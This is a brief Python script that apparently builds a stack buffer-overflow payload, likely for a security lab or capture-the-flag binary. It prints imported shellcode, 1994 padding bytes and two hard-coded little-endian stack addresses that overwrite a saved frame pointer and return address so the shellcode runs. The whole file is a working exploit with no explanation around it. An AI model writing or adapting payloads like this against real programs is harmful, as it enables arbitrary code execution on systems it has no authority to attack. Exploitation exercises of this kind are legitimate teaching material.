#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'0'*1994)
sys.stdout.buffer.write(0x7ffffff6db20.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6e338.to_bytes(8, 'little'))
